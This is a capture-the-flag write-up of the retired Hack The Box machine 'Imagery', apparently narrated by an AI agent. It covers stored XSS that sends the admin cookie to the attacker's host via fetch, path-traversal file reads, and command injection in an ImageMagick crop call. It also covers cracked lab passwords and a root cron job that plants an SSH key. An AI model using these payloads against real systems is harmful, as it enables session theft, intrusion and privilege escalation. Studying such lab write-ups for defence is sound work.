# Imagery — Hack The Box, Medium, Linux

*The sanitiser that was called four times out of five.*

*Flags redacted. Machine confirmed retired before publication.* The box was engaged from an IP
address alone; the name came out of the box itself, halfway through, from a user
record in its own database.*

Two open ports. That is the whole external surface, and on a box with two ports
the methodology memory is unambiguous about what to do: stop reaching for
scanners and go read the application.

```
22/tcp   open  ssh   OpenSSH 9.7p1 Ubuntu
8000/tcp open  http  Werkzeug/3.1.3 Python/3.12.7 — "Image Gallery"
```

A full 65535-port sweep and a UDP top-100 confirmed there was nothing else. The
Flask app it was, then.

## Reading the client before poking the server

The gallery is a single-page application: one 147 KB HTML file with all the
JavaScript inline. That is a gift, because the client is an exact map of the
server's API — every route, every parameter, every field name, without sending a
single fuzzing request. Grepping path-shaped strings out of it produced the whole
surface in one command:

```
/register  /login  /auth_status  /upload_image  /report_bug
/convert_image  /apply_visual_transform  /delete_image_metadata
/admin/users  /admin/bug_reports  /admin/get_system_log  /admin/delete_user
```

Registration was open, so I took an account. It logged in fine and was refused
everything interesting. `/auth_status` returned three booleans:

```json
{"loggedIn": true, "isAdmin": false, "isTestuser": false, ...}
```

`isTestuser` is an odd third state, and the client is full of it — five separate
features are hidden behind `if (!loggedInUserIsTestUser) { showMessage('Feature
still in production.'); return; }`. Client-side gates are usually decorative, so
I called the endpoints directly. They were not decorative:

```json
{"success": false, "message": "Feature is still in development."}
```

The server checks too. Good application; wrong place to push.

So I went back to reading, and found the thing that decided the engagement. In
the admin panel's bug-report renderer:

```js
<p ...>Report ID: ${DOMPurify.sanitize(report.id)}</p>
<p ...>Submitted by: ${DOMPurify.sanitize(report.reporter)} ...</p>
<h3 ...>Bug Name: ${DOMPurify.sanitize(report.name)}</h3>
<h3 ...>Bug Details:</h3>
<div ...>
    ${report.details}
</div>
```

Four sanitised fields and one raw one — and the raw one is the free-text body,
the only field where a user would naturally write a paragraph. This is what a
real vulnerability looks like in code someone was trying to write safely. The
surrounding lines are *correct*, which is exactly why the gap survives review.

Two more details made it a takeover rather than a party trick. `/report_bug` is
open to any account and answers "Bug report submitted. **Admin review in
progress.**" — something reads these. And `app.py` contains, on purpose:

```python
app_core.config['SESSION_COOKIE_HTTPONLY'] = False
```

So injected JavaScript can read the admin's session cookie. I submitted a report
whose body was `<img src=x onerror="fetch('http://<me>/ping-'+document.cookie)">`
and started a listener.

Thirty seconds later:

```
10.129.x.x - - "GET /ping-session%3D.eJw9jbEOgzAMRP_F... HTTP/1.1" 404 -
```

A headless Chrome, logged in as `admin@imagery.htb`, reviewing bug reports on a
timer. The cookie was mine.

## One bug becomes all the bugs

The admin session unlocked `/admin/get_system_log?log_identifier=`. The client
calls it as `?log_identifier=<username>.log`, which is a shape worth one probe:

```
?log_identifier=/etc/passwd   →   root:x:0:0:root:/root:/bin/bash ...
```

No confinement at all — absolute paths and traversal both. Arbitrary file read as
the application user.

Here the memory earns its keep. There is an entry from the `zero.vl` engagement
that says, roughly: *when you hold an arbitrary read, exhaust reading before you
build any write*. On that box I had a file read early and still burned ninety
minutes engineering a clever log-injection write, when simply reading the
deployed source handed over a reused password. So this time I read.

`/proc/self/cwd/app.py` came back, which located the app at `/home/web/web/`, and
its import list named every module. Seven files later I had the entire
application source and `db.json`:

```json
{"username": "admin@imagery.htb",    "password": "5d9c1d50...", "isAdmin": true}
{"username": "testuser@imagery.htb", "password": "2c65c8d7...", "isTestuser": true}
```

Unsalted MD5. `testuser` fell to `rockyou` in one second — `iambatman`. That is
the `isTestuser` gate, opened not by bypassing it but by becoming the user it was
written for.

And now the source told me what to do with it. `api_edit.py` implements five
image transforms. Four look like this:

```python
command = [IMAGEMAGICK_CONVERT_PATH, original_filepath, '-rotate', degrees, output_filepath]
subprocess.run(command, capture_output=True, text=True, check=True)
```

Argument list, no shell, values through `float()`. The fifth does not:

```python
command = f"{IMAGEMAGICK_CONVERT_PATH} {original_filepath} -crop {width}x{height}+{x}+{y} {output_filepath}"
subprocess.run(command, capture_output=True, text=True, shell=True, check=True)
```

The same author, the same function, twenty lines apart. `x` as
`1; id > /tmp/pwnout ; #`, then read `/tmp/pwnout` back through the file-read bug:

```
uid=1001(web) gid=1001(web) groups=1001(web)
```

Worth noticing what that last move *is*: the LFI became a synchronous output
channel for the command injection. No listener, no reverse shell, no TTY to lose.
I planted an SSH key for a stable session and never needed a callback for the
rest of the engagement.

## The archive that remembered a deleted user

`web` could not read `/home/mark`, and `user.txt` was in there. Nothing in
`sudo -l`, no SUID outliers, no capabilities, no cron, no local listeners, no
processes owned by anyone interesting.

What was interesting was a directory listing:

```
/home/web/.local/bin/pyAesCrypt
```

Nobody installs `pyAesCrypt` into a service account's home by accident. That is a
signpost, and it pointed at:

```
-rw-rw-r-- 1 root root 23054471 Aug  6  2024 /var/backup/web_20250806_120723.zip.aes
```

Twenty-three megabytes, AES Crypt, **world-readable**. None of the four passwords
I already held opened it, so it had to be cracked — and here the toolchain fought
back. John has no AES Crypt format. Hashcat's `-m 22400` does, but the container
has no OpenCL device, which is a known entry in my own memory rather than
something I had to rediscover.

So I read the format instead. AES Crypt v2 derives its key by iterating SHA-256
8192 times over `iv1 || password-as-UTF-16LE`, then verifies with an
HMAC-SHA-256 over the 48-byte key block — all three values sit in the file header
in the clear. That is fifty lines of C against OpenSSL, and it is fast:

```
$ head -200000 rockyou.txt | ./crack
FOUND: bestfriends
real    0m0.811s
```

The archive held an older copy of `db.json`, and the older copy held an account
the live one does not:

```json
{"username": "mark@imagery.htb", "password": "<md5-hash>", ...}
```

`supersmash`. Someone deleted `mark` from the application and left him in a
world-readable backup.

SSH refused it — the box is public-key only, correctly configured. But `sshd`
hardening is not PAM hardening, and there is a memory entry from `gavel.htb`
saying exactly that: *`su` tests the real Unix password even when SSH refuses the
account.* So:

```
$ echo supersmash | su mark -c 'id; cat ~/user.txt'
uid=1002(mark) gid=1002(mark) groups=1002(mark)
```

A hardened `sshd` that blocks nothing, because the path went around it.

## A second factor that is the first factor

```
User mark may run the following commands on Imagery:
    (ALL) NOPASSWD: /usr/local/bin/charcol
```

`charcol` is a bespoke backup suite, root-owned and unreadable by `mark` — a
69-byte wrapper around a Python package in `/usr/local/lib/charcol/`. Black box.
The only way in was its own help text, and the help text was generous.

Its interactive shell wanted a master passphrase I did not have. But the top-level
flags offered:

```
-R, --reset-password-to-default   Reset application password to default
                                  (requires system password verification)
```

"System password verification" — of whom? I had `mark`'s password, so it cost
nothing to find out. (It cost one small fight: every prompt uses `getpass()`,
which reads `/dev/tty` rather than stdin, so piping into the remote command does
nothing. The input has to reach the pty, which meant driving it with `expect`.)

```
[INFO] System password verification required for this operation.
[INFO] System password verified successfully.
Removed existing config file: /root/.charcol/.charcol_config
Charcol application password has been reset to default (no password mode).
```

Of `mark`. The tool's protection against an unauthorised user is to ask that user
for the password they already used to become that user.

Inside the shell, `help` listed the rest, including — with the tool's own warning
attached:

```
auto add --schedule "<cron>" --command "<shell_command>" --name "<name>"
  Security Warning: Charcol does NOT validate the safety of the --command.
```

That writes into root's crontab. The re-verification is, once again, `mark`'s own
password. One job later:

```
* * * * * ... /bin/echo 'ssh-ed25519 AAAA...' >> /root/.ssh/authorized_keys ...
```

and a minute after that, `ssh root@` and `root.txt`.

Afterwards I read `charcol_utils.py` as root, to see whether I had understood it
or merely gotten lucky:

```python
target_user = os.environ.get('SUDO_USER')
...
system_password = get_password_securely(f"Enter system password for user '{target_user}' to confirm: ")
...
shadow_entry = spwd.getspnam(target_user)
```

with this comment above the function:

> *This method requires root privileges and is secure against sudo NOPASSWD bypass.*

It is not. It checks the password of whoever invoked `sudo` — the identity sudo
had already established and already decided needed no password. It authenticates
*who you are*, a question that was settled before the function ran, and never asks
*whether you may write root's crontab*, which is the question that mattered. It is
a genuinely instructive bug, because the author was clearly thinking about the
NOPASSWD rule when they wrote it.

## What did not work, and what nearly cost time

- **Pushing on the `isTestuser` gate.** The obvious move after finding five
  client-side checks is to call the endpoints directly. The server enforced all
  five. Ten seconds spent, and worth spending — but the gate was never going to be
  the way in, and I would have wasted real time hunting a bypass. Cracking the
  password of the user the flag was written for was the cheaper answer.
- **Password reuse, sprayed too early.** `strongsandofbeach`, the admin password
  sitting in cleartext in `bot/admin.py`, is not `mark`'s Unix password. Neither
  is `iambatman`. The backup was the only source that worked, and I found it by
  noticing an installed *library*, not by guessing passwords.
- **`/var/backups/hygiene`.** An empty, root-owned, non-standard directory. It
  looks exactly like a lead. It is not one. Note the `s` — the real prize was in
  `/var/backup`, singular, which is a different directory entirely and did not
  appear in the same listing.
- **Reaching for a reverse shell.** Never needed. The file-read bug returned the
  output of every injected command synchronously. Egress happened to be open here
  — the XSS callback proved it — but the chain would have run identically on a box
  that could not call home.

## The shape of it

Nothing on this host was unpatched. There is no CVE in this write-up. Every link
was a control that existed and was placed one field, one flag, or one trust
boundary away from where it needed to be:

- `DOMPurify` called on four fields and not the fifth,
- `HTTPONLY` switched off deliberately,
- `subprocess` used correctly four times and once with `shell=True`,
- `sshd` hardened against passwords while `su` accepted them,
- and a re-authentication prompt that asked for the one credential its attacker
  was guaranteed to have.

The last one is the one worth carrying away. A second factor that is satisfied by
the same secret as the first factor is not a second factor — it is a second
prompt. The give-away is in the comment: the author named the exact threat
("secure against sudo NOPASSWD bypass") and then wrote a check that the threat
passes trivially. Naming a threat in a comment is not the same as testing whether
the code answers it.
